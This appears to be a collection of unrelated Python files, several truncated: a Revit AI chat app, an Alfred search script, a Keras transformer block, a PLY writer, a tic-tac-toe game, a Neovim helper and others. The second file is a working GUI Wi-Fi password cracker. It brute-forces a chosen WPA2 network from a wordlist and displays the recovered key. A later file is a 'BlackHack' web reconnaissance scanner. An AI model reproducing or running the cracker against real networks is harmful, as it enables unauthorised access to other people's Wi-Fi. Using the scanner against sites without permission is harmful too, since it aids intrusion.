    "# Import necessary Dynamo and Revit modules\r\nimport clr\r\nimport asyncio\r\nclr.AddReference('RevitServices')\r\nfrom RevitServices.Persistence import DocumentManager\r\nfrom RevitServices.Transactions import TransactionManager\r\n\r\nfrom Autodesk.Revit.ApplicationServices import Application\r\nfrom RevitServices.Persistence import DocumentManager\r\n\r\n\r\nimport sys\r\nimport os\r\n\r\nlocalapp = os.getenv(r'LOCALAPPDATA')\r\n\r\nsys.path.append(os.path.join(localapp, r'python-3.9.12-embed-amd64\\Lib\\site-packages'))\r\n\r\nimport System\r\nimport System.Drawing\r\nimport System.Windows.Forms # type: ignore\r\nimport time\r\n\r\nfrom huggingface_hub import InferenceClient, login\r\n\r\n# The inputs to this node will be stored as a list in the IN variables.\r\nresfresh, revitdata, modelname, system_prompt = IN # type: ignore\r\n\r\n# Initialize client for the selected model\r\nclient = InferenceClient(modelname)\r\n\r\n\r\nclass ChatForm(System.Windows.Forms.Form):\r\n    def __init__(self):\r\n        self.start_time = time.time()\r\n        self.conversation_history = []  # Initialize conversation history\r\n        self.InitializeComponent()\r\n        self.code_executed_correctly = False\r\n\r\n    def InitializeComponent(self):\r\n        self.Text = \"Dynamo AI Chat App\"\r\n        self.Size = System.Drawing.Size(700, 900)\r\n        self.toolTip = System.Windows.Forms.ToolTip()\r\n        self.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen\r\n        self.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Sizable\r\n        self.MaximizeBox = True\r\n        self.MinimizeBox = True\r\n\r\n        # Chat history window\r\n        self.chatHistory = System.Windows.Forms.RichTextBox()\r\n        self.chatHistory.Location = System.Drawing.Point(10, 10)\r\n        self.chatHistory.Size = System.Drawing.Size(670, 400)\r\n        self.chatHistory.ReadOnly = True\r\n        self.chatHistory.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D\r\n\r\n        # Chat input window\r\n        self.chatInput = System.Windows.Forms.RichTextBox()\r\n        self.chatInput.Multiline = True\r\n        self.chatInput.Location = System.Drawing.Point(10, 420)\r\n        self.chatInput.Size = System.Drawing.Size(670, 100)\r\n        self.chatInput.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D\r\n        self.chatInput.KeyDown += self.ChatInputKeyDown\r\n\r\n        # Send button\r\n        self.sendButton = System.Windows.Forms.Button()\r\n        self.sendButton.Text = \"Send\"\r\n        self.sendButton.Size = System.Drawing.Size(110, 25)\r\n        self.sendButton.Click += self.SendButtonClick\r\n        # Tooltip for chat input\r\n        self.toolTip.SetToolTip(self.chatInput, \"Type your message here. Press Ctrl + Enter to send.\")\r\n\r\n        # Read Revit data button\r\n        self.readRevitButton = System.Windows.Forms.Button()\r\n        self.readRevitButton.Text = \"Read Revit Data\"\r\n        self.readRevitButton.Size = System.Drawing.Size(110, 25)\r\n        self.readRevitButton.Click += self.ReadRevitButtonClick\r\n        # Tooltip for read Revit data button\r\n        self.toolTip.SetToolTip(self.readRevitButton, \"This will import the active Revit model's data into the chatbot for analysis.\")\r\n\r\n        # Save button\r\n        self.saveButton = System.Windows.Forms.Button()\r\n        self.saveButton.Text = \"Save\"\r\n        self.saveButton.Size = System.Drawing.Size(110, 25)\r\n        self.saveButton.Click += self.SaveButtonClick\r\n        # Tooltip for save button\r\n        self.toolTip.SetToolTip(self.saveButton, \"This will save the chat history as a txt file.\")\r\n        \r\n        # Run Code button\r\n        self.runCodeButton = System.Windows.Forms.Button()\r\n        self.runCodeButton.Text = \"Run Code\"\r\n        self.runCodeButton.Size = System.Drawing.Size(110, 25)\r\n        self.runCodeButton.Click += self.RunCodeButtonClick\r\n        # Tooltip for run code button\r\n        self.toolTip.SetToolTip(self.runCodeButton, \"This will execute the code typed in the chat input.\")\r\n\r\n        # Integer input textbox\r\n        self.intInput = System.Windows.Forms.TextBox()\r\n        self.intInput.Size = System.Drawing.Size(50, 25)\r\n        self.intInput.Text = \"5\"\r\n        # Tooltip for integer input textbox\r\n        self.toolTip.SetToolTip(self.intInput, \"Enter a number from 1 to 20. This will be used as the number of times the chatbot will autorun.\")\r\n\r\n        # Run Code Agent button\r\n        self.runCodeAgentButton = System.Windows.Forms.Button()\r\n        self.runCodeAgentButton.Text = \"Run Code Agent\"\r\n        self.runCodeAgentButton.Size = System.Drawing.Size(110, 25)\r\n        self.runCodeAgentButton.Click += self.RunCodeAgentClick\r\n        # Tooltip for Run Code Agent button\r\n        self.toolTip.SetToolTip(self.runCodeAgentButton, \"This will run the chatbot in a loop until the specified number of iterations is reached.\")\r\n\r\n        # Time taken label\r\n        self.timeLabel = System.Windows.Forms.Label()\r\n        self.timeLabel.Size = System.Drawing.Size(130, 25)\r\n\r\n        # FlowLayoutPanel for buttons at the bottom\r\n        self.b",
    "import time\nimport pywifi\nfrom pywifi import const\nfrom tkinter import *\nfrom tkinter import messagebox, ttk, filedialog  # Import filedialog\nimport os\nimport pyperclip\nimport threading\n\n# Initialize variables\navailable_devices = []\nkeys = []\nfinal_output = {}\nrunning_cracking = False  # Global variable to track if cracking is running\n\n# Function to scan for Wi-Fi networks\ndef scan_networks(interface):\n    interface.scan()\n    time.sleep(5)  # Wait for the scan to complete\n    networks = interface.scan_results()\n    return [network.ssid for network in networks if network.ssid]  # Filter out empty SSIDs\n\n# Function to attempt connecting to an open network\ndef connect_open_network(interface, ssid):\n    profile = pywifi.Profile()\n    profile.ssid = ssid\n    profile.auth = const.AUTH_ALG_OPEN\n    profile.akm.append(const.AKM_TYPE_NONE)\n    interface.remove_all_network_profiles()\n    interface.add_network_profile(profile)\n    interface.connect(profile)\n    time.sleep(4)\n    return interface.status() == const.IFACE_CONNECTED\n\n# Function to attempt connecting to a secured network with a password\ndef connect_secured_network(interface, ssid, password):\n    profile = pywifi.Profile()\n    profile.ssid = ssid\n    profile.auth = const.AUTH_ALG_OPEN\n    profile.akm.append(const.AKM_TYPE_WPA2PSK)\n    profile.cipher = const.CIPHER_TYPE_CCMP\n    profile.key = password\n    interface.remove_all_network_profiles()\n    interface.add_network_profile(profile)\n    interface.connect(profile)\n\n    # Wait for connection status\n    for _ in range(10):  # Check status for 10 seconds\n        if interface.status() == const.IFACE_CONNECTED:\n            return True\n        time.sleep(1)\n    return False\n\n# Function to update the list of available networks in the GUI\ndef update_network_list():\n    global available_devices\n    available_devices = scan_networks(interface)\n    network_listbox.delete(0, END)\n    for ssid in available_devices:\n        network_listbox.insert(END, ssid)\n    result_text.set(\"Networks scanned.\")\n\n# Function to start the password cracking process\ndef start_cracking():\n    global running_cracking\n    selected_network = network_listbox.get(ACTIVE)\n    if not selected_network:\n        messagebox.showerror(\"Error\", \"Please select a Wi-Fi network.\")\n        return\n\n    # Attempt to read the password list file\n    password_file = file_entry.get()\n    if not os.path.isfile(password_file):\n        messagebox.showerror(\"Error\", f\"File '{password_file}' not found. Please make sure the file exists.\")\n        return\n\n    with open(password_file, 'r') as f:\n        keys = [line.strip() for line in f]\n\n    # Clear previous results\n    progress['value'] = 0\n    result_text.set(\"Trying passwords...\")\n    root.update_idletasks()\n\n    found_password = None\n    running_cracking = True\n\n    # Run cracking in a background thread\n    def run_cracking():\n        nonlocal found_password\n        for password in keys:\n            if not running_cracking:\n                result_text.set(\"Cracking process stopped.\")\n                return\n            progress['value'] += 1\n            root.update_idletasks()\n            process_text.insert(END, f\"Trying password: {password}\\n\")\n            process_text.yview(END)\n            if connect_secured_network(interface, selected_network, password):\n                found_password = password\n                break\n\n        if found_password:\n            final_output[selected_network] = found_password\n            result_text.set(f\"Success! Password for '{selected_network}' is '{found_password}'.\")\n            show_congratulation_popup(selected_network, found_password)\n        else:\n            result_text.set(f\"No valid password found for '{selected_network}'.\")\n\n    threading.Thread(target=run_cracking, daemon=True).start()\n\n# Function to show congratulation popup\ndef show_congratulation_popup(ssid, password):\n    def on_ok():\n        popup.destroy()\n\n    popup = Toplevel(root)\n    popup.title(\"Password Found\")\n    popup.geometry(\"300x200\")\n    popup.configure(bg=\"#222222\")  # Dark background\n\n    Label(popup, text=\"Congratulations!\", font=(\"Courier New\", 14, \"bold\"), bg=\"#222222\", fg=\"#00FF00\").pack(pady=10)\n    Label(popup, text=f\"Password for '{ssid}' is:\", font=(\"Courier New\", 12), bg=\"#222222\", fg=\"#00FF00\").pack(pady=5)\n    password_label = Label(popup, text=password, font=(\"Courier New\", 12, \"bold\"), bg=\"#222222\", fg=\"#00FF00\")  # Neon green\n    password_label.pack(pady=5)\n\n    Button(popup, text=\"Copy Password\", command=lambda: copy_password(password), bg=\"#00FF00\", fg=\"black\").pack(pady=5)\n    Button(popup, text=\"OK\", command=on_ok, bg=\"#222222\", fg=\"#00FF00\").pack(pady=10)\n\n# Function to copy the discovered password to clipboard\ndef copy_password(password):\n    pyperclip.copy(password)\n    messagebox.showinfo(\"Copied\", \"Password copied to clipboard!\")\n\n# Function to display a loading spinner while scanning networks or cracking\ndef show_loading_spinner():\n    spinner = [\"|\", \"/\", \"-\", \"\\\\\"]\n    d",
    "#!/usr/bin/env python3\n\nimport json\nimport os\nimport sys\n\nfrom src.searchers.web_searcher import get_built_in_searches, get_custom_web_searches\nfrom src.searchers.workflow_searcher import get_workflow_searches\nfrom src.searchers.alias_searcher import get_shell_aliases\n\ndef get_all_searches():\n    \"\"\"Get all searches from all sources.\"\"\"\n    items = []\n    \n    try:\n        # Get built-in searches\n        items.extend(get_built_in_searches())\n        \n        # Get workflow searches\n        items.extend(get_workflow_searches())\n        \n        # Get shell aliases\n        items.extend(get_shell_aliases())\n        \n        # Get custom web searches\n        items.extend(get_custom_web_searches())\n\n        return {\"items\": items}\n        \n    except Exception as e:\n        return {\n            \"items\": [{\n                \"title\": \"Error reading searches\",\n                \"subtitle\": str(e),\n                \"valid\": False\n            }]\n        }\n\ndef filter_results(items, filter_type=None, search_query=\"\"):\n    \"\"\"Filter results based on type and search query.\"\"\"\n    filtered_items = []\n\n    \n    for item in items:\n        # Apply type filter if specified\n        if filter_type and item[\"variables\"][\"type\"] != filter_type:\n            continue\n        \n        # If there's no search query after the filter, include all items of that type\n        if not search_query:\n            filtered_items.append(item)\n            continue\n            \n        # Get searchable text based on type\n        searchable_text = item[\"variables\"].get(\"searchable_text\", \"\").lower()\n        if not searchable_text:\n            # Fallback to concatenating all searchable fields\n            searchable_fields = [\n                item[\"title\"],\n                item[\"subtitle\"],\n                item[\"variables\"].get(\"keyword\", \"\"),\n                item[\"variables\"].get(\"display_text\", \"\")\n            ]\n            searchable_text = \" \".join(field for field in searchable_fields if field).lower()\n        \n        # Add item if search query matches\n        if search_query in searchable_text:\n            filtered_items.append(item)\n    \n    return filtered_items\n\nif __name__ == \"__main__\":\n    # Get query from Alfred\n    args = sys.argv[1:] if len(sys.argv) > 1 else []\n    \n    # Debug logging\n    debug_log_path = os.path.expanduser('~/Desktop/alfred_debug.log')\n    with open(debug_log_path, 'a') as f:\n        f.write(f\"\\nReceived args: {sys.argv}\\n\")\n        f.write(f\"Args: {args}\\n\")\n    \n    # Get all results\n    results = get_all_searches()\n    \n    if args:\n        first_arg = args[0].lower()\n        \n        # Check for type filter as first word\n        filter_type = None\n        search_query = \"\"\n        \n        if first_arg == \"_web\":\n            filter_type = \"websearch\"\n            search_query = \" \".join(args[1:]).lower() if len(args) > 1 else \"\"\n        elif first_arg == \"_work\":\n            filter_type = \"workflow\"\n            search_query = \" \".join(args[1:]).lower() if len(args) > 1 else \"\"\n        elif first_arg == \"_alias\":\n            filter_type = \"alias\"\n            search_query = \" \".join(args[1:]).lower() if len(args) > 1 else \"\"\n        elif first_arg == \"_cmd\":\n            filter_type = \"command\"\n            search_query = \" \".join(args[1:]).lower() if len(args) > 1 else \"\"\n        elif first_arg == \"_git\":\n            filter_type = \"git\"\n            search_query = \" \".join(args[1:]).lower() if len(args) > 1 else \"\"\n        elif first_arg == \"web\":\n            filter_type = \"websearch\"\n            search_query = \" \".join(args[1:]).lower() if len(args) > 1 else \"\"\n        elif first_arg == \"wf\":\n            filter_type = \"workflow\"\n            search_query = \" \".join(args[1:]).lower() if len(args) > 1 else \"\"\n        else:\n            search_query = \" \".join(args).lower()\n        \n        # Filter results\n        filtered_items = filter_results(results[\"items\"], filter_type, search_query)\n        \n        results[\"items\"] = filtered_items\n    \n    # Output results to Alfred\n    print(json.dumps(results)) ",
    "from tensorflow.keras.layers import MultiHeadAttention, Layer, LayerNormalization, Dropout, Dense\nfrom tensorflow.keras.models import Sequential\n\nclass TransformerBlock(Layer):\n    def __init__(self, embed_dim, num_heads, ff_dim, rate=0.1):\n        super(TransformerBlock, self).__init__()\n        self.att = MultiHeadAttention(num_heads=num_heads, key_dim=embed_dim)\n        self.ffn = Sequential([\n            Dense(ff_dim, activation=\"relu\"),\n            Dense(embed_dim),\n        ])\n        self.layernorm1 = LayerNormalization(epsilon=1e-6)\n        self.layernorm2 = LayerNormalization(epsilon=1e-6)\n        self.dropout1 = Dropout(rate)\n        self.dropout2 = Dropout(rate)\n        self.embed_dim = embed_dim\n        self.num_heads = num_heads\n        self.ff_dim = ff_dim\n        self.rate = rate\n\n    def call(self, inputs, training):\n        attn_output = self.att(inputs, inputs)\n        attn_output = self.dropout1(attn_output, training=training)\n        out1 = self.layernorm1(inputs + attn_output)\n        ffn_output = self.ffn(out1)\n        ffn_output = self.dropout2(ffn_output, training=training)\n        return self.layernorm2(out1 + ffn_output)\n\n    def get_config(self):\n        config = super().get_config()\n        config.update({\n            \"embed_dim\": self.embed_dim,\n            \"num_heads\": self.num_heads,\n            \"ff_dim\": self.ff_dim,\n            \"rate\": self.rate,\n        })\n        return config",
    "import io\nimport struct\nfrom contextlib import contextmanager\nfrom typing import BinaryIO, Iterator, Optional\n\nimport numpy as np\n\n\ndef write_ply(\n    raw_f: BinaryIO,\n    coords: np.ndarray,\n    rgb: Optional[np.ndarray] = None,\n    faces: Optional[np.ndarray] = None,\n):\n    \"\"\"\n    Write a PLY file for a mesh or a point cloud.\n\n    :param coords: an [N x 3] array of floating point coordinates.\n    :param rgb: an [N x 3] array of vertex colors, in the range [0.0, 1.0].\n    :param faces: an [N x 3] array of triangles encoded as integer indices.\n    \"\"\"\n    with buffered_writer(raw_f) as f:\n        f.write(b\"ply\\n\")\n        f.write(b\"format binary_little_endian 1.0\\n\")\n        f.write(bytes(f\"element vertex {len(coords)}\\n\", \"ascii\"))\n        f.write(b\"property float x\\n\")\n        f.write(b\"property float y\\n\")\n        f.write(b\"property float z\\n\")\n        if rgb is not None:\n            f.write(b\"property uchar red\\n\")\n            f.write(b\"property uchar green\\n\")\n            f.write(b\"property uchar blue\\n\")\n        if faces is not None:\n            f.write(bytes(f\"element face {len(faces)}\\n\", \"ascii\"))\n            f.write(b\"property list uchar int vertex_index\\n\")\n        f.write(b\"end_header\\n\")\n\n        if rgb is not None:\n            rgb = (rgb * 255.499).round().astype(int)\n            vertices = [\n                (*coord, *rgb)\n                for coord, rgb in zip(\n                    coords.tolist(),\n                    rgb.tolist(),\n                )\n            ]\n            format = struct.Struct(\"<3f3B\")\n            for item in vertices:\n                f.write(format.pack(*item))\n        else:\n            format = struct.Struct(\"<3f\")\n            for vertex in coords.tolist():\n                f.write(format.pack(*vertex))\n\n        if faces is not None:\n            format = struct.Struct(\"<B3I\")\n            for tri in faces.tolist():\n                f.write(format.pack(len(tri), *tri))\n\n\n@contextmanager\ndef buffered_writer(raw_f: BinaryIO) -> Iterator[io.BufferedIOBase]:\n    if isinstance(raw_f, io.BufferedIOBase):\n        yield raw_f\n    else:\n        f = io.BufferedWriter(raw_f)\n        yield f\n        f.flush()\n",
    "import os\nimport subprocess\nfrom urllib.parse import urljoin, urlparse\nfrom playwright.sync_api import sync_playwright\n\nBANNER = r\"\"\"\n                                           _______                                             .---.          \n                   __.....__     /|        \\  ___ `'.         __.....__   .----.     .----..--.|   |          \n       _     _ .-''         '.   ||         ' |--.\\  \\    .-''         '.  \\    \\   /    / |__||   |          \n /\\    \\\\   ///     .-''\"'-.  `. ||         | |    \\  '  /     .-''\"'-.  `. '   '. /'   /  .--.|   |          \n `\\\\  //\\\\ ///     /________\\   \\||  __     | |     |  '/     /________\\   \\|    |'    /   |  ||   |          \n   \\`//  \\'/ |                  |||/'__ '.  | |     |  ||                  ||    ||    |   |  ||   |          \n    \\|   |/  \\    .-------------'|:/`  '. ' | |     ' .'\\    .-------------''.   `'   .'   |  ||   |          \n     '        \\    '-.____...---.||     | | | |___.' /'  \\    '-.____...---. \\        /    |  ||   |          \n               `.             .' ||\\    / '/_______.'/    `.             .'   \\      /     |__||   |          \n                 `''-...... -'   |/\\'..' / \\_______|/       `''-...... -'      '----'          '---'          \n                                 '  `'-'`                                                                     \n\"\"\"\n\ndef main():\n    print(BANNER)\n    print(\"Welcome to WebDevil: Advanced Web Scanner by BlackHack\\n\")\n\n    # Get user input\n    url = input(\"Enter the website URL (e.g., https://example.com): \").strip()\n    keyword = input(\"Enter the word to search for: \").strip()\n    exclude_length = input(\"Enter the response length to exclude for Gobuster (e.g., 9914): \").strip()\n\n    # Ensure proper URL format\n    if not url.startswith(\"http://\") and not url.startswith(\"https://\"):\n        url = f\"https://{url}\"\n\n    with sync_playwright() as p:\n        browser = p.chromium.launch(headless=True)\n        context = browser.new_context()\n        page = context.new_page()\n\n        # Initialize results\n        console_results = []\n        network_results = []\n        dom_matches = []\n        js_files = []\n        metadata_matches = []\n        subpages = set()\n\n        def on_console_message(msg):\n            if keyword in msg.text:\n                console_results.append(msg.text)\n\n        def on_response(response):\n            try:\n                body = response.body().decode('utf-8', errors='ignore')\n                if keyword in body:\n                    lines_with_keyword = [line for line in body.splitlines() if keyword in line]\n                    network_results.append(f\"URL: {response.url}\\nStatus: {response.status}\\nMatches:\\n\" + \"\\n\".join(lines_with_keyword) + \"\\n\")\n            except Exception:\n                pass\n\n        # Attach listeners\n        page.on(\"console\", on_console_message)\n        page.on(\"response\", on_response)\n\n        # Visit the URL\n        print(f\"[+] Navigating to: {url}\")\n        page.goto(url)\n\n        # Search DOM\n        print(f\"[+] Searching DOM for keyword: {keyword}\")\n        dom_matches = page.evaluate(f\"\"\"\n            () => {{\n                const matches = [];\n                const elements = document.querySelectorAll(\"*\");\n                elements.forEach(el => {{\n                    if (el.textContent.includes(\"{keyword}\")) {{\n                        matches.push(el.outerHTML);\n                    }}\n                }});\n                return matches;\n            }}\n        \"\"\")\n\n        # Extract internal links (subpages)\n        print(\"[+] Extracting internal links...\")\n        links = page.evaluate(\"\"\"\n            () => Array.from(document.querySelectorAll('a'))\n                .map(link => link.href)\n                .filter(href => href.startsWith(window.location.origin))\n        \"\"\")\n        subpages.update(links)\n\n        # Scan each subpage\n        print(\"[+] Scanning subpages for keyword...\")\n        for subpage in subpages:\n            print(f\"[+] Scanning subpage: {subpage}\")\n            try:\n                page.goto(subpage)\n                body = page.content()\n                if keyword in body:\n                    dom_matches.append(f\"Subpage URL: {subpage}\\nMatches:\\n\" + \"\\n\".join(\n                        [line for line in body.splitlines() if keyword in line]))\n            except Exception as e:\n                print(f\"[-] Error scanning subpage {subpage}: {e}\")\n\n        # Search for JavaScript files\n        print(\"[+] Searching for JavaScript files...\")\n        js_files = page.evaluate(\"\"\"\n            () => Array.from(document.querySelectorAll('script')).map(script => script.src).filter(src => src)\n        \"\"\")\n\n        # Extract metadata\n        print(\"[+] Extracting metadata...\")\n        metadata_matches = page.evaluate(\"\"\"\n            () => {\n                const metas = document.querySelectorAll('meta');\n                return Array.from(metas).map(meta => ({\n                    name: meta.getAttribute('name'),\n              ",
    "# SPDX-License-Identifier: MIT\n\n\"\"\"\nThis module defines exceptions and error handling utilities. It is the\nrecommend path to access ``ConfiguratonError``, ``ConfigurationWarning``, and\n``ExceptionGroup``. For backward compatibility, ``ConfigurationError`` is\nre-exported in the top-level package.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport builtins\nimport contextlib\nimport dataclasses\nimport sys\nimport typing\nimport warnings\n\n__all__ = [\n    \"ConfigurationError\",\n    \"ConfigurationWarning\",\n    \"ExceptionGroup\",\n]\n\n\ndef __dir__() -> list[str]:\n    return __all__\n\n\nclass ConfigurationError(Exception):\n    \"\"\"Error in the backend metadata. Has an optional key attribute, which will be non-None\n    if the error is related to a single key in the pyproject.toml file.\"\"\"\n\n    def __init__(self, msg: str, *, key: str | None = None):\n        super().__init__(msg)\n        self._key = key\n\n    @property\n    def key(self) -> str | None:  # pragma: no cover\n        return self._key\n\n\nclass ConfigurationWarning(UserWarning):\n    \"\"\"Warnings about backend metadata.\"\"\"\n\n\nif sys.version_info >= (3, 11):\n    ExceptionGroup = builtins.ExceptionGroup\nelse:\n\n    class ExceptionGroup(Exception):\n        \"\"\"A minimal implementation of `ExceptionGroup` from Python 3.11.\n\n        Users can replace this with a more complete implementation, such as from\n        the exceptiongroup backport package, if better error messages and\n        integration with tooling is desired and the addition of a dependency is\n        acceptable.\n        \"\"\"\n\n        message: str\n        exceptions: list[Exception]\n\n        def __init__(self, message: str, exceptions: list[Exception]) -> None:\n            self.message = message\n            self.exceptions = exceptions\n\n        def __repr__(self) -> str:\n            return f\"{self.__class__.__name__}({self.message!r}, {self.exceptions!r})\"\n\n\n@dataclasses.dataclass\nclass ErrorCollector:\n    \"\"\"\n    Collect errors and raise them as a group at the end (if collect_errors is True),\n    otherwise raise them immediately.\n    \"\"\"\n\n    collect_errors: bool\n    errors: list[Exception] = dataclasses.field(default_factory=list)\n\n    def config_error(\n        self,\n        msg: str,\n        *,\n        key: str | None = None,\n        got: typing.Any = None,\n        got_type: type[typing.Any] | None = None,\n        warn: bool = False,\n        **kwargs: typing.Any,\n    ) -> None:\n        \"\"\"Raise a configuration error, or add it to the error list.\"\"\"\n        msg = msg.format(key=f'\"{key}\"', **kwargs)\n        if got is not None:\n            msg = f\"{msg} (got {got!r})\"\n        if got_type is not None:\n            msg = f\"{msg} (got {got_type.__name__})\"\n\n        if warn:\n            warnings.warn(msg, ConfigurationWarning, stacklevel=3)\n        elif self.collect_errors:\n            self.errors.append(ConfigurationError(msg, key=key))\n        else:\n            raise ConfigurationError(msg, key=key)\n\n    def finalize(self, msg: str) -> None:\n        \"\"\"Raise a group exception if there are any errors.\"\"\"\n        if self.errors:\n            raise ExceptionGroup(msg, self.errors)\n\n    @contextlib.contextmanager\n    def collect(self) -> typing.Generator[None, None, None]:\n        \"\"\"Support nesting; add any grouped errors to the error list.\"\"\"\n        if self.collect_errors:\n            try:\n                yield\n            except ExceptionGroup as error:\n                self.errors.extend(error.exceptions)\n        else:\n            yield\n",
    "from tkinter import *\n\n# Initialisation des variables\nplayer = \"X\"\nwinner = None\n\n# Fonction pour changer de joueur\ndef next_player():\n    global player\n    if player == \"X\":\n        player = \"O\"\n    else:\n        player = \"X\"\n\n# Fonction pour colorer les cases gagnantes\ndef color_winner(buttons):\n    for button in buttons:\n        button.config(bg=\"green\")\n\n# Fonction pour v\u00e9rifier le gagnant\ndef check_winner():\n    global winner\n    winning_combinations = [\n        (b1, b2, b3),\n        (b4, b5, b6),\n        (b7, b8, b9),\n        (b1, b4, b7),\n        (b2, b5, b8),\n        (b3, b6, b9),\n        (b1, b5, b9),\n        (b3, b5, b7),\n    ]\n    for combination in winning_combinations:\n        if combination[0][\"text\"] == combination[1][\"text\"] == combination[2][\"text\"] == player:\n            winner = player\n            color_winner(combination)\n            label_status.config(text=f\"Le joueur {player} a gagn\u00e9 !\")\n            return True\n    return False\n\n# Fonction pour g\u00e9rer les clics sur les boutons\ndef on_click(button):\n    if button[\"text\"] == \"\" and not winner:\n        button.config(text=player)\n        if not check_winner():\n            next_player()\n            label_status.config(text=f\"Tour du joueur {player}\")\n\n# Cr\u00e9ation de la fen\u00eatre principale\nroot = Tk()\nroot.title(\"Morpion\")\n\n# Label pour le statut\nlabel_status = Label(root, text=\"Tour du joueur X\", font=(\"Arial\", 16))\nlabel_status.grid(row=0, column=0, columnspan=3)\n\n# Cr\u00e9ation des boutons\nb1 = Button(root, text=\"\", font=(\"Arial\", 24), height=2, width=5, command=lambda: on_click(b1))\nb2 = Button(root, text=\"\", font=(\"Arial\", 24), height=2, width=5, command=lambda: on_click(b2))\nb3 = Button(root, text=\"\", font=(\"Arial\", 24), height=2, width=5, command=lambda: on_click(b3))\nb4 = Button(root, text=\"\", font=(\"Arial\", 24), height=2, width=5, command=lambda: on_click(b4))\nb5 = Button(root, text=\"\", font=(\"Arial\", 24), height=2, width=5, command=lambda: on_click(b5))\nb6 = Button(root, text=\"\", font=(\"Arial\", 24), height=2, width=5, command=lambda: on_click(b6))\nb7 = Button(root, text=\"\", font=(\"Arial\", 24), height=2, width=5, command=lambda: on_click(b7))\nb8 = Button(root, text=\"\", font=(\"Arial\", 24), height=2, width=5, command=lambda: on_click(b8))\nb9 = Button(root, text=\"\", font=(\"Arial\", 24), height=2, width=5, command=lambda: on_click(b9))\n\n# Placement des boutons dans la grille\nb1.grid(row=1, column=0)\nb2.grid(row=1, column=1)\nb3.grid(row=1, column=2)\nb4.grid(row=2, column=0)\nb5.grid(row=2, column=1)\nb6.grid(row=2, column=2)\nb7.grid(row=3, column=0)\nb8.grid(row=3, column=1)\nb9.grid(row=3, column=2)\n\n# Boucle principale\nroot.mainloop()\n",
    "\"\"\"\nUse NeoVim as a simple TUI with the help of a handler script.\n\nUsage:\n    nvimtui ./handler.sh\n\nhandler.sh should linewise read from stdin for events. It will get three lines in succession. The first is the event type, the second two are arguments.\n\nIt first gets (\"url\", \"\", \"\", \"\"), then (\"<primary|secondary|something else>\", \"possible argument\", \"url of open buffer\", \"contents of line event was executed on\")\n\nThe handler should return the action it wants to perform, then 0 or more arguments then '.END.' (without quotes) to indicate the end of its response.\nAvailable actions shown in the program.\n\nAs an example, the following is a simple file system browser handler script:\n\n    #!/bin/sh\n    event=\"\"\n    arg1=\"\"\n    arg2=\"\"\n    arg3=\"\"\n    pos=0\n\n    while read -r line;do\n        if [ $pos -eq 0 ];then\n            event=\"$line\"\n        elif [ $pos -eq 1 ];then\n            arg1=\"$line\"\n        elif [ $pos -eq 2 ];then\n            arg2=\"$line\"\n        else\n            arg3=\"$line\"\n        fi\n        pos=$(echo \"($pos + 1) % 4\" | bc)\n        if [ ! $pos -eq 0 ];then\n            continue\n        fi\n\n        if [ \"$event\" = \"url\" ];then\n            echo \"setbuffer\"\n            echo \"text 1\"\n            if [ x\"$arg1\" = x\"\" ];then\n                arg1=\"/\"\n            fi\n            if [ -d \"$arg1\" ];then\n                find \"$arg1\" -maxdepth 1\n            else\n                cat $arg1\n            fi\n        elif [ \"$event\" = \"primary\" ];then\n            echo \"seturl\"\n            echo \"$arg3\" | awk '{$1=$2=\"\";print $0}'\n        fi\n        echo \".END.\"\n    done\n\"\"\"\n\nimport os\nimport subprocess\nimport sys\nimport time\nimport threading\nfrom fcntl import fcntl, F_GETFL, F_SETFL\nfrom os import O_NONBLOCK, read\n\nimport pynvim\n\n\nURL_PREFIX = \"nvimtui://\"\n\n\ndef user_log(con, message):\n    con.command(f\"echo 'Nvimtui: {message}'\")\n\n\ndef calculate_url(con):\n    result = con.call(\"nvim_buf_get_name\", 0)\n    if result.startswith(URL_PREFIX):\n        return result[len(URL_PREFIX):]\n    else:\n        return result\n\n\ndef handle_nvim_action(proc, con, args, state):\n    user_log(con, \"Calling subprocess\")\n    try:\n        proc.stdin.write(\"\\n\".join(args) + \"\\n\")\n    except BrokenPipeError:\n        user_log(con, \"Subprocess closed unexpectedly\\n\" + proc.stderr.read())\n        return\n\n    args = []\n    while True:\n        line = proc.stdout.readline().strip()\n        if line == \".END.\":\n            break\n        args.append(line)\n\n    error_output = b\"\"\n    try:\n        while True:\n            # Load up any error output\n            error_output += read(proc.stderr.fileno(), 1024)\n    except OSError:\n        if len(error_output) > 0:\n            con.lua.print(error_output.decode())\n            user_log(con, \"Error running subprocess, :messages for more\")\n        else:\n            # This seems to be how you clear the statusline\n            con.command(\"echo ''\")\n\n    if len(args) == 0:\n        return\n\n    action, *action_args = args\n\n    handle_action(proc, con, action, action_args, state)\n\n\ndef handle_action(proc, con, action, action_args, state):\n    target_window = state[\"window\"]\n    try:\n        target_buffer = con.call(\"nvim_win_get_buf\", target_window)\n    except pynvim.api.common.NvimError:\n        target_window = con.call(\"nvim_get_current_win\")\n        target_buffer = con.call(\"nvim_get_current_buf\")\n\n    def set_opt(name, value):\n        con.call(\n            \"nvim_set_option_value\",\n            name,\n            value,\n            {\"buf\": target_buffer}\n        )\n\n    def edit_file(path):\n        # Wasn't able to find a short and reliable way of editing a file in a\n        # given buffer, so wrote this. But it has bugs; doesn't always add\n        # to the recent buffers list. Was losing the contents of a buffer\n        # on ',s'. So I'm leaving in most of my target_window code, but\n        # it won't work currently.\n\n        con.command(\"edit \" + path)\n        # target_buffer_number = -1\n        # for buffer_number in con.call(\"nvim_list_bufs\"):\n        #     if con.call(\"nvim_buf_get_name\", buffer_number) == path:\n        #         target_buffer_number = buffer_number\n        #         break\n        #\n        # if target_buffer_number != -1:\n        #     con.call(\"nvim_win_set_buf\", target_window, target_buffer_number)\n        # else:\n        #     con.call(\"nvim_buf_set_name\", target_buffer, path)\n        #     if not path.startswith(URL_PREFIX):\n        #         with open(path) as fh:\n        #             con.call(\n        #                 \"nvim_buf_set_lines\",\n        #                 target_buffer,\n        #                 0,\n        #                 -1,\n        #                 False,\n        #                 [\n        #                     l.strip()\n        #                     for l in fh.readlines()\n        #                 ]\n        #             )\n\n\n    if action == \"setbuffer\":\n        buf_properties = action_args[0].split(\" \")\n\n        set_opt(\"modifiable\", True)\n        con.call(\"nvim_buf_set_",
